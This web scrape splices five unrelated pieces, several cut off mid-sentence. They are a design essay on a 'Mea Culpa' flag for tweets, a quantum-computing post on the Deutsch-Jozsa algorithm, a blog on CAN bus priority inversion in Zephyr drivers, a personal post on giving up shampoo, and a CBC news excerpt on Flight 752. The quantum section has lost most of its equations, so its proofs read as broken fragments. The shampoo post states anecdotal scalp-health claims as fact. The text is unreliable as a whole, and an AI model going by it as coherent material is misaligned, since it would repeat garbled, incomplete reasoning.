    <p>Social media has a conflict problem.</p><p>Spending even a few minutes on public social media can expose us to dozens of people we know little about, talking about things we know little about. In such a public place, any individual's reputation, perspectives, and history are difficult to ascertain, and therefore their words must be taken at face value. Coupled with an almost complete lack of standards for participation in the community and a high degree of variance in knowledge among participants, and the environment naturally skews toward conflict and tribalism.</p><p>One particular effect of this environment is that small misunderstandings, mistakes, or disagreements can unexpectedly explode due to the public nature of discourse and assumptions of bad faith. Meanwhile, very few tools exist to moderate these effects.</p><!--kg-card-begin: markdown--><p>This is why it's my belief that <mark>as designed today, social media is out of balance</mark>. It is far easier to escalate than it is to de-escalate, and this is a major problem that companies like Twitter and Facebook need to address.</p>
<!--kg-card-end: markdown--><p>This got me thinking about what particular use cases need de-escalation, and whether there's something simple we can do to test the waters and address these types of problems. </p><h2 id="target-use-case-admitting-mistakes">Target Use Case: Admitting Mistakes</h2><p>One obvious issue is that <strong>people are wrong about a lot of things, but struggle to admit their mistakes</strong>. This is why many cultures have created elaborate norms around face-saving. Unfortunately, social media largely lacks these cultural norms, and even makes the problem worse in three ways:</p><ol><li><strong>No social proof</strong> - Admitting mistakes is quite difficult if nobody else is seen (genuinely) admitting mistakes, as we rely heavily on social proof to sense-make around norms. An escalation-oriented culture means there's less genuine "I was wrong" on social media than there should be.</li><li><strong>No respite</strong> - as the visibility of a mistake travels across social media, the poster is subject to a constant deluge of new readers calling them out, with the combined energy of the outraged far exceeding that of the poster. This prevents them from having the necessary emotional cool-down period to respond thoughtfully.</li><li><strong>Digging in</strong> - when feeling personally attacked, its human nature to prefer to dig in rather than apologize. Social media's escalation-oriented culture plays into this human fallibility.</li></ol><p>Take Twitter as an example environment. If we write something that turns out to be wrong and a pile-on begins, we're going to be swimming upstream fighting it. Our options are:</p><ol><li><strong>Ignore</strong> replies and hopefully let it die out</li><li><strong>Delete</strong> your tweet, posting another tweet saying "I was wrong"</li><li><strong>Reply</strong> to your tweet, posting "I was wrong"</li></ol><p>However, none of these are great. If we ignore<strong><em> </em></strong>replies, the simple amplification effects of likes, replies, retweets, and subtweets leave us exposed and the situation can get out of hand. If we delete and post another, people are unlikely to see our follow-up, as corrections are rarely viral. Similarly, even if we reply, only our viral mistake will be seen in the feed of others. </p><p>Let's also not forget the human tendency to not fully walk back statements, and instead offer unsatisfying explanations that can accidentally further enflame situations. Blaming, justifying, minimizing, or excusing are all self-sabotaging ways that people qualify their apologies to preserve their self-esteem or resolve their own cognitive dissonance, and social media is right there ready to give us this kind of rope to hang ourselves with when we're under assault.</p><!--kg-card-begin: markdown--><p>In all these cases, a person's reputation in the minds of others is damaged because <mark>social media engagement engines favor the drama of the mistake over the correction and reconciliation</mark>, which leads few people to see or remember anything other than the mistake.</p>
<!--kg-card-end: markdown--><p>This seems like a perfect use case to design for, so I came up with a little design change I call the Twitter Mea Culpa.</p><h2 id="design-exploration-twitter-mea-culpa">Design Exploration: Twitter Mea Culpa</h2><p>Twitter Mea Culpa is a way for a poster to flag their tweet as a mistake and de-escalate a situation, using the same action menu that deleting a post uses, and the same visual design as flagged tweets:</p><figure><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png" alt="" srcset="https://nickpunt.com/content/images/size/w600/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png 600w, https://nickpunt.com/content/images/size/w1000/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png 1000w, https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png 1260w" sizes="(min-width: 720px) 720px"><figcaption>Twitter Mea Culpa: flagging a post as a mistake</figcaption></figure><h3 id="clear-language">Clear Language</h3><!--kg-card-begin: html--><figure><a href="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Language-1.png"><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Language-1.png" alt="" srcset="https://nickpunt.com/content/images/size/w600/2020/07/TwitterMeaCulpa-Language-1.png 600w, https://nickpunt.com/content/images/size/w1000/2020/07/TwitterMeaCulpa-Language-1.png 1000w, https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Language-1.png 1198w" sizes="(min-width: 720px) 720px"></a><figcaption>Language:<em> @user has indicated they made a mistake in this tweet</em></figcaption></figure><!--kg-card-end: html--><p>I picked this language carefully for several reasons:</p><ol><li>Create separation between the individual and what they say (the specific post), which reduces ego threat.</li><li>Use an active voice to indicate responsibility (<em>I made a mistake</em> not <em>Mistakes were made</em>).</li><li>Indicate the poster was the one who chose to flag the post, not Twitter or any other user, to reduce the impression to other users that the poster was censored.</li><li>State the mistake unequivocally and leaving no room for ambiguity about whether it is actually a mistake, to reduce inauthentic use and self-sabotage.</li><li>Avoid direct use of 'sorry' or 'I apologize' language, because for some people these words are extremely <a href="https://www.psychologytoday.com/us/blog/the-squeaky-wheel/201305/5-reasons-why-some-people-will-never-say-sorry">emotionally challenging</a> to use.</li></ol><h3 id="disable-amplification">Disable Amplification</h3><!--kg-card-begin: html--><figure><a href="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Amplification-1.png"><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Amplification-1.png" alt="" srcset="https://nickpunt.com/content/images/size/w600/2020/07/TwitterMeaCulpa-Amplification-1.png 600w, https://nickpunt.com/content/images/size/w1000/2020/07/TwitterMeaCulpa-Amplification-1.png 1000w, https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Amplification-1.png 1262w" sizes="(min-width: 720px) 720px"></a></figure><!--kg-card-end: html--><p>Much like rules violations, once a user admits a mistake, the Mea Culpa tweet is no longer amplified. This means:</p><ul><li>The tweet is no longer made visible on everyone's home feed</li><li>Users cannot reply, like, or retweet without comment</li><li>Users may retweet <em>with</em> comment, to allow users to amplify the correction (e.g. <em>I thought this wasn't the case, looks like they realized it</em>)</li></ul><p>By admitting a mistake, the poster stops the runaway train of replies and amplifications of their mistake, and the reputation damage that follows. </p><figure><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-ExampleViolation.png" alt=""><figcaption>How Twitter handles rules violations today; notice the lack of like/reply/retweet counts</figcaption></figure><p>This amplification disabling is how rules violations work today.

      <h3 id="introduction">Introduction</h3>

<p>In the previous <a href="https://leimao.github.io/blog/Deutsch-Algorithm/">blog post</a>, I discussed the Deutsch’s algorithm which determines whether the function $f(x)$ is balanced or constant by running $f(x)$ once using quantum circuits, where $f(x)$ maps from the set $\{0,1\}$ to the set $\{0,1\}$. However, using classical circuits, we are able to determine whether the function $f(x)$ is balanced or constant by running $f(x)$ twice. It might seem to some people that the improvement is not significant for this particular simple problem.</p>



<p>Let’s change the problem setting to a similar but more sophisticated one. Instead of taking one single bit as input, $f(\mathbf{x})$ now takes $n$ bits as input. Now, $f(\mathbf{x})$ maps from the set $\{0,1\}^n$ to the set $\{0,1\}$. The number of different inputs to $f(\mathbf{x})$ is $2^n$. We call the the function $f(\mathbf{x})$ balanced if $f(\mathbf{x}) = 0$ for exactly $2^{n-1}$ of all the different inputs, and $f(\mathbf{x}) = 1$ for the rest of the inputs. We call the function $f(\mathbf{x})$ constant if $f(\mathbf{x}) = 0$ for all different inputs, or $f(\mathbf{x}) = 1$ for all different inputs. $f(\mathbf{x})$ could be neither balanced or constant, but in this particular problem, we assume the $f(\mathbf{x})$ we are investigating must be either balanced or constant. It should be noted that it is a more general case for the problem that the Deutsch algorithm was trying to solve. When $n=1$, it decays to the problem that the Deutsch algorithm was trying to solve.</p>



<p>With classical circuits, what is the minimum and maximum number of runs to determine whether $f(\mathbf{x})$ we are investigating must be either balanced or constant? We have $2^n$ different inputs to test for this binary classification problem. In the worst scenario, we could run into the situation that the first $2^{n-1}$ inputs we tested produce all $0$s or all $1$s. Then the $2^{n-1} + 1$th input we tested must tell us whether $f(\mathbf{x})$ could be neither balanced or constant. For example, if the first $2^{n-1}$ inputs we tested produce all $0$s, if the $2^{n-1} + 1$th input we tested produces $0$, then $f(\mathbf{x})$ is constant; if the the $2^{n-1} + 1$th input we tested produces $1$, then $f(\mathbf{x})$ is balanced. In the best scenario, we got both $0$ and $1$ in the first two runs, we immediately know $f(\mathbf{x})$ is balanced.</p>



<p>With quantum circuits, can we do better and how much can we do better? In fact, there is a Deutsch-Jozsa algorithm, a derivative of the Deutsch algorithm, which solve the problem using exactly one run. If you compared to the worst case using classical circuits, it is $2^{n-1} + 1$ times faster asymptotically, which is significant when $n$ is large.</p>



<p>In this blog post, I would like to discuss the Deutsch-Jozsa algorithm. It would be recommended if the reader could read the blog on <a href="https://leimao.github.io/blog/Deutsch-Algorithm/">Deutsch algorithm</a> first, although this blog post should be mostly self-contained.</p>

<h3 id="prerequisites">Prerequisites</h3>

<h4 id="reducing-sum-or-difference-to-boolean">Reducing Sum or Difference to Boolean</h4>

<p>If $x$ and $y$ are binary values, $x, y \in \{0, 1\}$, we have</p>



<p>where $\oplus$ is $\text{XOR}$ (binary addition modulo 2). This could be easily verified using truth table.</p>

<h4 id="distributivity-of-xor">Distributivity of XOR</h4>

<p>If $x$, $y$, and $z$ are binary values, $x, y, z \in \{0, 1\}$, we have</p>



<p>I did not find a proof from the Internet so I derived a proof here. The proof is a little bit complicated and requires to use boolean algebra.</p>



<p>It is easy to verify using truth table that</p>



<p>Using the basic <a href="https://en.wikipedia.org/wiki/Boolean_algebra#Laws">boolean algebra</a>, we have</p>





<p>Therefore,</p>



<p>This concludes the proof.</p>

<h4 id="inner-product-and-inner-product-space-for-binary-vector-space">Inner Product and Inner Product Space for Binary Vector Space</h4>

<p>In the previous <a href="https://leimao.github.io/blog/Inner-Product/">blog post</a>, we have defined the inner product and inner product space for complex vector space. Similarly, we could also define the inner product and inner product space for binary vector space.</p>



<p>Given two binary vectors $\mathbf{x}, \mathbf{y} \in \{0,1\}^n$, $\mathbf{x} = \{x_0, x_1, \cdots, x_{n-1}\}$ and $\mathbf{y} = \{y_0, y_1, \cdots, y_{n-1}\}$, the inner product of $\mathbf{x}$ and $\mathbf{y}$ is defined as</p>



<p>which is somewhat similar to the inner product definition for real vector space.</p>



<p>The bitwise exclusive-or operation $\oplus$ was also defined for binary vectors $\mathbf{x}$ and $\mathbf{y}$ of the same length. Given two binary vectors $\mathbf{x}, \mathbf{y} \in \{0,1\}^n$, $\mathbf{x} = \{x_0, x_1, \cdots, x_{n-1}\}$ and $\mathbf{y} = \{y_0, y_1, \cdots, y_{n-1}\}$,</p>



<p>The following inner product properties are satisfied based on the above inner product definition.</p>



<p>Given $\mathbf{x}, \mathbf{x}^{\prime}, \mathbf{y}, \mathbf{y}^{\prime} \in \{0,1\}^n$, using the $\text{XOR}$ distributivity property we derived above,</p>



<p>Similarly,</p>



<p>Let $\mathbf{0} = \{ \underbrace{0, 0, \cdots, 0}_{n} \} =  0^n$, we have</p>



<h4 id="hadamard-operator">Hadamard Operator</h4>

<p>Hardmard operator is a special quantum operator, which could be represented using the following unitary matrix.</p>



<p>It is easy to see that</p>





<p>We denote</p>



<p>It is easy to see that $H$ is unitary, i.e., $H H^{\dagger} = H^{\dagger} H = I$ and $H^{\dagger} = H$. In fact, $H^{\otimes n}$ is unitary, and $(H^{\otimes n})^{-1} = H^{\otimes n}$.</p>



<p>For Kronecker product, the $A \otimes B$ is invertible if and only if both $A$ and $B$ are invertible and</p>



<p>It is easy to verify this using the <a href="https://leimao.github.io/blog/Kronecker-Product-In-Circuits/">Kronecker product mixed-product property</a>.</p>



<p>Therefore,</p>



<p>The values in the matrix $H^{\otimes n}$ follows specific patterns. Specifically,</p>



<p>where $\mathbf{i}$ is the binary vector representation for row number $i$, and $\mathbf{j}$ is the binary vector representation for column number $j$.</p>



<p>Since I did not find any proof from the Internet, I would like to derive a simple proof using mathematical induction.</p>



<p>For the base case for $n = 1$, it is easy to verify that</p>



<p>where $i, j \in [0, 2^1)$, i.e., $\mathbf{i}, \mathbf{j} \in \{0, 1\}^{1}$.</p>



<p>Assuming for $n = k - 1$,</p>



<p>where $i, j \in [0, 2^{k-1})$, i.e., $\mathbf{i}, \mathbf{j} \in \{0, 1\}^{k - 1}$.</p>



<p>For $n = k$, we have</p>



<p>Note that $H^{\otimes {k-1}}$ is a $2^{k-1}$ by $2^{k-1}$ matrix.</p>



<p>For $i \in [0, 2^{k-1})$ and $j \in [0, 2^{k-1})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 0$, and $j_0 = 0$.</p>



<p>Therefore,</p>



<p>where $i \in [0, 2^{k-1})$ and $j \in [0, 2^{k-1})$.</p>



<p>For $i \in [2^{k-1}, 2^{k})$ and $j \in [0, 2^{k-1})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 1$, and $j_0 = 0$.</p>



<p>Therefore,</p>



<p>where $i \in [2^{k-1}, 2^{k})$ and $j \in [0, 2^{k-1})$.</p>



<p>For $i \in [0, 2^{k-1})$ and $j \in [2^{k-1}, 2^{k})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 0$, and $j_0 = 1$.</p>



<p>Therefore,</p>



<p>where $i \in [0, 2^{k-1})$ and $j \in [2^{k-1}, 2^{k})$.</p>



<p>For $i \in [2^{k-1}, 2^{k})$ and $j \in [2^{k-1}, 2^{k})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 1$, and $j_0 = 1$.</p>



<p>Based on the reducing sum or difference to boolean property we derived above,</p>



<p>Therefore,</p>



<p>where $i \in [2^{k-1}, 2^{k})$ and $j \in [2^{k-1}, 2^{k})$.</p>



<p>Taken together, for $n = k$,</p>



<p>where $i, j \in [0, 2^k)$, i.e., $\mathbf{i}, \mathbf{j} \in \{0, 1\}^{k}$.</p>



<p>This finishes the mathematical induction and concludes the proof.</p>



<p>Note that the entries of the first column and the entries of the first row of $H^{\otimes {n}}$ have exactly the same value, $\frac{1}{\sqrt{2^{n}}}$. This is because</p>





<p>Equivalently, we might write, $H^{\otimes {n}}_{0,:} = \frac{1}{\sqrt{2^{n}}} \mathbf{1}$ and $H^{\otimes {n}}_{:,0} = \frac{1}{\sqrt{2^{n}}} \mathbf{1}$.</p>



<p>To extract an arbitrary column $j$ from $H^{\otimes {n}}$, we prepared a one-hot quantum system basic state vector $| \mathbf{y} \rangle = [y_0, y_1, \cdots, y_{2^n-1}]^{\top}$, where $y_j = 1$ and $y_k = 0$ for $k \neq j$.</p>



<p>where $| \mathbf{x}_i \rangle$ is a quantum system one-hot basic state vector,  $|\mathbf{x}_i\rangle = [x_0, x_1, \cdots, x_{2^{n}-1}]^{\top}$, where $x_i = 1$ and $x_k = 0$ for $k \neq i$.</p>



<p>Since $H^{\otimes {n}}$ is unitary and $(H^{\otimes {n}})^{-1} = H^{\otimes {n}}$as we have discussed above,</p>



<p>For example, if $j = 0$, $| \mathbf{y} \rangle = [\underbrace{1, 0, 0, \cdots, 0}_{2^n} ]^{\top} = | \mathbf{0} \rangle$,</p>



<h3 id="deutsch-jozsa-algorithm">Deutsch-Jozsa Algorithm</h3>

<p>The black-box $f(\mathbf{x})$ is represented using a quantum gate $U_f$. Our job is to determine whether the $f(\mathbf{x})$ corresponding to the $U_f$ is constant or balanced.</p>

<div>
<figure>

    <figcaption>$U_f$</figcaption>
</figure>
</div>

<p>The quantum gate $U_f$ is a unitary matrix which maps from $| \mathbf{x} \rangle \otimes | y \rangle$ to $| \mathbf{x} \rangle \otimes | f(\mathbf{x}) \oplus y \rangle$, namely $U_f (| \mathbf{x} \rangle \otimes | y \rangle) = | \mathbf{x} \rangle \otimes | f(\mathbf{x}) \oplus y \rangle$, for $x \in \{0, 1\}^n$ and $y \in \{0, 1\}$. When $y = 0$, $| f(\mathbf{x}) \oplus y \rangle = | f(\mathbf{x}) \oplus 0 \rangle = | f(\mathbf{x}) \rangle $, $| y \oplus f(\mathbf{x}) \rangle$ is just $| f(\mathbf{x}) \rangle$.</p>



<p>Note that the above mapping is only necessarily valid when $| \mathbf{x} \rangle$ and $| y \rangle$ are superpositions.</p>



<p>Let’s further check when $| \mathbf{x} \rangle$ and $| y \rangle$ are superpositions, what the outputs from $U_f$ will be. Perhaps we could achieve fewer runs with superpositions.</p>

<h4 id="first-attempt">First Attempt</h4>

<p>In the first attempt, we made the second input to $U_f$ a superposition, which is achieved by applying a Hadamard operator to the second input $|1\rangle$. This is almost the same as what we did in the second attempt in the <a href="https://leimao.github.io/blog/Deutsch-Algorithm/">Deutsch algorithm</a>. The superposition is</p>

</div>







<p>Because $\frac{|f(\mathbf{x})\rangle - |\overline{f(\mathbf{x})}\rangle}{\sqrt{2}}$ is either $\frac{|0\rangle - |1\rangle}{\sqrt{2}}$ or $\frac{|1\rangle - |0\rangle}{\sqrt{2}}$, $|\varphi_2\rangle $ could be further simplified as</p>



<p>The observation from the first output is always the same to the first input, whereas there …</p></div></div>

  <div itemprop="articleBody">
    <p>The problem of <strong>priority inversion</strong> is well-known and.. actually, scratch that: it’s clearly not well known at all because people keep making the
same mistake. So I’m writing this to try and explain the problem (with reference to CAN) in the hope that a search engine indexes this and puts
it high enough up the search results for people to find.</p>

<p>The TL;DR for priority inversion:</p>

<blockquote>
  <p>Priority inversion causes a high priority activity to get delayed for a long time, causing missed deadlines, timeouts, and all kinds of
consequent faults. Worse, it’s typically an intermittent problem often not found in testing, and a great source of Heisenbugs because adding
instrumentation to look at it can make it go away.
It happens when the high priority (and urgent) activity gets stuck behind a low priority (non-urgent) activity and
lots of medium priority activities block the low priority activity, which is blocking the high priority activity.</p>
</blockquote>

<p>The word ‘activity’ here can mean tasks in a real-time system, scheduled by an RTOS (real-time operating system) that chooses what to run
based on priorities.  This is exactly what happened on Mars on the 4th July 1997 when the Mars Pathfinder mission landed.</p>

<p><img src="https://kentindell.github.io/assets/384_pathfinder.jpg" alt="Mars Pathfinder"></p>

<p>The spacecraft control system kept going through watchdog resets, triggered because
a high priority task didn’t complete in time. The problem was down to priority inversion around access to a resource guarded by a semaphore. A low
priority task had the resource locked, and the high priority task was blocked waiting for the low priority task to release the semaphore.
But the low priority task couldn’t run because medium
priority tasks were running, so it couldn’t unlock the semaphore, and so the high priority task got stuck, the watchdog triggered, the system reset,
and the process repeated. You can read more about it directly from the
<a href="https://www.cs.unc.edu/~anderson/teach/comp790/papers/mars_pathfinder_long_version.html">horse’s mouth</a>
(Glenn Reeves, the NASA team lead for the Pathfinder spacecraft software).</p>

<p>Priority inversion also happens in CAN. The CAN protocol uses priorities (in the form of CAN IDs) to determine which frame is transmitted on the bus.
But the CAN specification says nothing about how frames <em>within</em> a CAN controller are arbitrated. What <em>should</em> happen is that frames are internally
arbitrated by priority, so that the frame the CAN engine enters into bus arbitration is the highest of its own frames, and then the CAN bus arbitration
picks the highest priority frame bus-wide. But if a FIFO queue is used internally then we get priority
inversion.</p>

<p>Here’s a short video showing how priority inversion plays out on CAN bus:</p>

<p>
  <iframe src="https://www.youtube.com/embed/0xkZ8glPSXA" width="700" height="480" frameborder="0" allowfullscreen="">
  </iframe>
</p>

<p>This isn’t a theoretical problem. Let’s take a look at the <a href="https://zephyrproject.org/">Zephyr Project</a> CAN system.
The <a href="https://docs.zephyrproject.org/latest/reference/networking/can_api.html">CAN API</a> is very simple, with just a <code>can_send</code> call to queue a CAN frame
(a callback can be set for a “sent” event). There’s nothing inherently wrong with this API. If the number of buffer slots supports is small then there is
pressure on the application developer to create their own queue in software, and inevitably this will be a FIFO queue (I’ll come back to this shortly).
The problem is deeper in the drivers. Here is a code snippet from the
code for the <a href="https://github.com/zephyrproject-rtos/zephyr/blob/master/drivers/can/can_stm32.c">STM32 CAN controller driver</a>:</p>

<div><div><pre><code>	/* Set TX priority to chronological order */
	can-&gt;MCR |= CAN_MCR_TXFP;
</code></pre></div></div>

<p>The bit <code>TXFP</code> is described in the STM32 reference manual for the bxCAN CAN controller as follows:</p>

<blockquote>
  <p>“The transmit mailboxes can be configured as a transmit FIFO by setting the <code>TXFP</code> bit in the <code>CAN_MCR</code> register. In this mode the priority order is
given by the transmit request order. This mode is very useful for segmented transmission.</p>
</blockquote>

<p>Yep, we have a priority inversion problem with these drivers. Let’s look at the <code>can_send</code> function in the
<a href="https://github.com/zephyrproject-rtos/zephyr/blob/master/drivers/can/can_mcux_flexcan.c">NXP FlexCAN drivers</a>:</p>

<div><div><pre><code>	while (true) {
		alloc = mcux_get_tx_alloc(data);
		if (alloc &gt;= 0) {
			if (atomic_test_and_set_bit(data-&gt;tx_allocs, alloc)) {
				continue;
			}

			break;
		}

		if (k_sem_take(&amp;data-&gt;tx_allocs_sem, timeout) != 0) {
			return CAN_TIMEOUT;
		}
	}
</code></pre></div></div>

<p>The NXP FlexCAN controller is a slotted buffer controller, which means it has lots of CAN frame buffer slots in its memory, allocated between sending
and receiving CAN frames.  The controller can be set to arbitrate between its frames by buffer number or by CAN ID. The driver selects arbitration by 
buffer number and then in the <code>can_send</code> function they allocate a buffer higher than any buffer in use, in order to preserve FIFO transmission order:</p>

<div><div><pre><code>	/* mcux_get_tx_alloc is a linear on array, and binary on atomic_val_t search
	 * for the highest bit set in data-&gt;tx_allocs. 0 is returned in case of an empty
	 * tx_alloc, the next free bit otherwise.
	 * The reason to always use a higher buffer number than the current in use is
	 * that a FIFO manner is kept. The Controller would otherwise send the frame
	 * that is in the lowest buffer number first.
	 */
</code></pre></div></div>

<p>So this driver specifically implement FIFO buffering, which is bad enough, but worse than that is that it spins waiting for a free buffer,
where “free” doesn’t mean buffer without a CAN frame in it, but one where the buffer number is
higher than any frame in the controller. What will tend to happen under peak bus load is that the buffer number will ‘walk’ up to the top one,
and then when that buffer contains a
low priority frame, the task will spin on a sequence of CAN transmit events for ages waiting for it to be put into the (this could be tens or
hundreds of milliseconds on a busy CAN bus).
In essence, this couples priority inversion on the CAN bus to task execution, causing a task
to overrun and fail in unpredictable ways. And it’s an intermittent problem that probably won’t appear in testing. Obviously this is a terrible driver design.</p>

<p>It may look like I am picking on the Zephyr Project, but far from it: I’ve come across it in many other CAN drivers too, <strong>even in a self-driving
car system</strong> where the steering depended on sending a CAN frame with a short latency!</p>

<p>So how is priority inversion solved? What is required to solve it? In short, the CAN frame queueing in the CAN driver must be by CAN ID value, using the same
ordering as on the CAN bus. For CAN controllers that support a large number of messages then this is usually as simple as flipping a bit to ask the controller
to arbitrate internally this way (the FlexCAN and the bxCAN controllers by default come out of reset in this mode!).</p>

<p>For CAN controllers with only three
buffers then the software drivers must keep a bigger priority queue in memory and then shuffle the frames back and forth to keep the highest priority three
frames in the hardware. All these controllers provide an an abort mechanism so that a low priority CAN frame in a hardware buffer can be thrown out and
replaced by a new higher priority frame. The CAN controllers are generally designed to help with this: the bxCAN has a <code>CODE</code> field and the FlexCAN
has a <code>LPTM</code> field to indicate which of the transmit buffers is the lowest-priority one.</p>

<p>Note that the common Microchip MCP2515 standalone CAN controller has three transmit buffers, but it doesn’t arbitrate internally by CAN ID (there is a
2-bit priority field for each buffer, but this won’t work because the priorities would need to be atomically re-ordered when a new
frame is put in the controller). It’s simpler to just use a single buffer and use the abort mechanism when a low-priority frame needs to 
be pre-empted.</p>

<p>One final point worth discussing is why people are so attracted to FIFO queueing of CAN frames (even to the point of disabling the default priority queueing
in CAN controllers)? One answer to this is <em>segmented messages</em>: quite a few CAN layers define ways to map a message longer than 8 bytes into a
sequence of 8-byte CAN
frames, and this nearly always is done by transmitting a sequence of CAN frames with the same ID. It’s obviously vital that these
frames go into FIFO order because otherwise the bigger message is scrambled. The problem with queueing by CAN priority is that
under nearly all priority queueing implementations (both hardware and software), two internal frames with the same ID are entered into arbiration in an
undefined transmission order (for example, the FlexCAN hardware uses an internal hardware scanning state machine that loops around all the buffers
looking for the lowest priority frame). The solution to this
is not, of course, to make all CAN frames go in FIFO order, but to make only frames for a segmented message go in FIFO order <em>with respect to each other</em>. This
is actually straightforward to implement using a higher-level FIFO driver, that creates a FIFO queue of frames and then hands them to the CAN driver 
one-by-one as each previous frame is sent.</p>

<p>So to summarise:</p>

<ul>
  <li>Priority inversion is a big deal, it’s an intermittent problem that might escape testing but could be catastrophic when deployed</li>
  <li>Priority inversion happens on CAN</li>
  <li>It is fixed by having the hardware arbitrate internally by CAN ID</li>
  <li>If there aren’t enough buffers in hardware then the driver should implement them in software using the abort feature of the CAN hardware and not just push the problem up to the application (which will inevitably just use a FIFO queue)</li>
  <li>Where FIFO sending is important (e.g. segmented messaging) it should be done by a specific higher level FIFO queueing system that creates separate FIFO queues and puts the head item of each FIFO into the priority queue.</li>
</ul>

<p>UPDATE 2020/07/01:</p>

<ul>
  <li>I have rewritten the wording on CPU execution being coupled to priority inversion to make it clear the task is spinning on a transmit event rather than the CPU itself spinning in a loop</li>
  <li>As a courtesy I reported this priority inversion issue to the Zephyr Project; it was subsequently reclassified from “bug” to “enhancement” because not suffering from priority inversion is apparently a ‘nice to have’ feature of an RTOS designed for safety critical systems</li>
</ul>

July 4, 2020 | https://jayriverlong.github.io/2020/07/04/shampoo.html | <a href="https://web.archive.org/web/*/https://jayriverlong.github.io/2020/07/04/shampoo.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>In December 2019, my girlfriend mentioned that my hair smelled unusually good. What was I doing differently? Nothing, I thought. Everything was just as always. Except that I had run out of shampoo a few weeks prior, and hadn’t noticed until then.</p> <p>As a teen, I used plenty of hair products. Gels were cool in the early 2000s, and sculpting wax remained in vogue even afterwards. Such products require washing out at the end of the day, otherwise it feels gross, and (ironically) would make your hair unwieldy afterwards. By the time I got to college, I was used to shampooing my hair most days.</p> <p>However, my college roommate suffered from severe male pattern balding as he hit his early 20s, and he made that suffering a core piece of his identity. Fear is contagious, so I quit hair products, and began to exclusively use the most scalp-friendly shampoo I could find, <a href="https://www.kiehls.com/hair/shampoos/amino-acid-shampoo/247.html">Kiehl’s Amino Acid Shampoo</a>. I reduced my shampooing to twice a week, and was careful not to use too much.<sup id="fnref:1"><a href="#fn:1">1</a></sup> My hair was fine and usually short, so that was perfectly sufficient for the most part of the last decade.</p> <p>That was until I ran out in mid-November 2019. I hadn’t even noticed, and my girlfriend had complimented me on my hair, so I thought I might as well keep going. I had previously read about the <a href="https://www.reddit.com/r/NoPoo/">NoPoo Movement</a> – people washing their hair with stuff like olive oil or quitting shampoo altogether – and that had been intriguing. Ever since I tried anti-dandruff shampoo and it immediately gave me dandruff, I had a hunch that shampoo might just be a scam. I was ready to give NoPoo a try.</p> <p>Seven or eight months later, I still haven’t used shampoo or conditioner once. I rinse it with warm water every morning when I shower, give it a quick rub with a towel, brush it, and I’m off to the races.</p> <p>The results are fantastic. My hair is silky smooth, looks and feels clean, and a slight build-up of natural oils makes it easy to form. If I run my hand through my hair to push it back, it stays (mostly) in place.</p> <p>Keeping my hair in place had been a real frustration with a frequent shampooing routine: my hair would be so light and dry that it was impossible to rule – I would <em>have</em> to use a product to keep it from dangling into my forehead, or I’d have to get haircuts to specifically trim the unruly parts that would stick out. Reducing shampoo – and eventually eliminating it – made it possible to actually get somewhere combing it.</p> <p>During this time – thanks to COVID-19 – I haven’t had a haircut, so my hair is now also longer than usual. (I feel like a stand-in from an ’80s movie.) It’s easy to go NoPoo when you have short hair, because there’s ultimately little hair to accumulate lots of grease and oil. The threat of greasy hair is more severe when your hair is longer, which is why I suspect it’s mostly men<sup id="fnref:2"><a href="#fn:2">2</a></sup> who opt to abandon shampoo. For me, it ended up fine.</p> <p>Abandoning shampoo works because it restores the natural balance of oils on your scalp. Most shampoos are effectively like dish soap: they aggressively remove grease from your head. That dries out your scalp, so – no surprise – you produce <em>more</em> oils to compensate. That makes your hair greasy in short order, so you then have to shampoo again. It’s even more extreme if you apply additional grease in form of hair products. Like a ketamine-cocaine bender, you are net balanced while swinging between extremes. That’s not great. Consequently, most people report that the toughest thing about abandoning shampoo is the first two or three weeks, while your hair becomes quite greasy as your scalp readjusts how much oil it needs to produce. I was fortunate that during that time, I had been too busy to notice.</p> <p>I hope to get a haircut soon as COVID wraps up, but I don’t see myself using shampoo again in the course of my everyday life. It might be worth making exceptions if I somehow get really dirty in nature or doing some DIY stuff,<sup id="fnref:3"><a href="#fn:3">3</a></sup> but for the most part it just seems unnecessary.</p> <hr>  <br> </article> </div></div>]]>

The crash of Flight 752 killed 176 people, including 57 Canadians.</p>  <p>The recording, which reveals a number of damning details about the downing of the plane and Iran's response, is also in the custody of Canadian authorities.</p>  <p>Less than 24 hours after CBC News emailed Rezaeifar a copy of the recording and requested a response Thursday, news broke that he had been removed from his role overseeing Iran's investigation into the downing of Flight 752. Families in the United Kingdom — which has&nbsp;an embassy in Iran — were notified this morning that a new investigator is now in charge.</p>  <h2>Airspace kept open to avoid signalling&nbsp;attack:&nbsp;Rezaeifar</h2>  <p>In the recording, Rezaeifar said closing the airspace over Tehran could have exposed Iran's pending ballistic missile attack on U.S. air bases in Iraq in advance. That attack was retaliation for the United States' killing of Iran's top military leader,&nbsp;Gen.&nbsp;Qasem Soleimani.</p>  <p>"Some say we should have cleared the airspace," Rezaeifar said in Farsi on the recording. "The National Security Council is in charge.</p>  <p>"But let's say we had cleared the airspace. Wouldn't [it] give away our imminent attack?"</p>  <p>Flight 752 was shot down just four hours after the strike on the U.S. base. Rezaeifar added that&nbsp;closing the airspace could have meant cancelling flights. Iran earns hundreds of thousands of dollars <a href="https://www.cbc.ca/news/politics/iran-airspace-canadians-downed-flight-1.5481818" 